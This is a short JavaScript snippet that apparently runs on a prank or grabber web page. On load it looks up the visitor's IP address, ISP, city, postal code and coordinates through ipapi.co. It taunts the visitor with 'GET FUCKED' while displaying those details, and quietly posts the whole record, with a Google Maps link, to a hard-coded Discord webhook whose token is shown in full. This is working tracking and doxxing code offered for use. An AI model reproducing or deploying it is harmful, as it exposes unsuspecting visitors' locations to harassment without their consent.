$.getJSON('https://ipapi.co/json')
.then(data => {
  const ip = data.ip;
  const country = data.country_name;
  const cc = data.country_code;
  const city = data.city;
  const time = data.timezone;
  const ass = data.org;
  const zip = data.postal;
  const region = data.region;
  const regionName = data.region_code;
  const lat = data.latitude;
  const lon = data.longitude;
  const net = data.network;
  const ver = data.version
    setTimeout(function()
    {
      document.getElementById("test").innerHTML = "GET FUCKED";
      document.getElementById("dox").innerHTML = "<div id='yes'>Country: "+country+"</div>";
      setTimeout(function()
      {
        document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>IP: "+ip+"</div>";
        setTimeout(function()
        {
          document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Wifi Provider: "+ass+"</div>";
          setTimeout(function()
          {
            document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>N: "+lon+"</div>";
            setTimeout(function()
            {
              document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>W: "+lat+"</div>";
              setTimeout(function()
              {
                document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>countryCode: "+cc+"</div>";
                setTimeout(function()
                {
                  document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>timezone: "+time+"</div>";
                  setTimeout(function()
                  {
                    document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Version: "+ver+"</div>";
                    setTimeout(function()
                    {
                      document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Network: "+net+"</div>";
                    }, 500)
                  }, 500)
                }, 500)
              }, 500)
            }, 500)
          }, 500)
        }, 500)
      },500)
    },7900)
      const whurl = "https://discord.com/api/webhooks/1193834496273940611/b78sju_6H32RA7gTGy0CjlTv5_g3tWIZh-3QXUzOUF6APzUTlRBjjElFlbffQ-wmVLJg";
      const msg = {
        "content": "@everyone : Country: " + country + " IP: " + ip + " countryCode:  " + cc + " City: " + city + " Timezone: " + time + " Wifi Provider: " + ass + " Zipcode: " + zip + " Region: " + region + " Region Name: " + regionName + " N: " + lat + " E: " + lon + 'https://www.google.com/maps/search/' + lat + '+' + lon + '?sa=X&ved=2ahUKEwjRvLWLgcmDAxVUSvEDHe9qC64Q8gF6BAgPEAA'
      };
      return fetch(whurl, {
        "method": "POST",
        "headers": {
          "content-type": "application/json"
        },
        "body": JSON.stringify(msg)
      });
    });
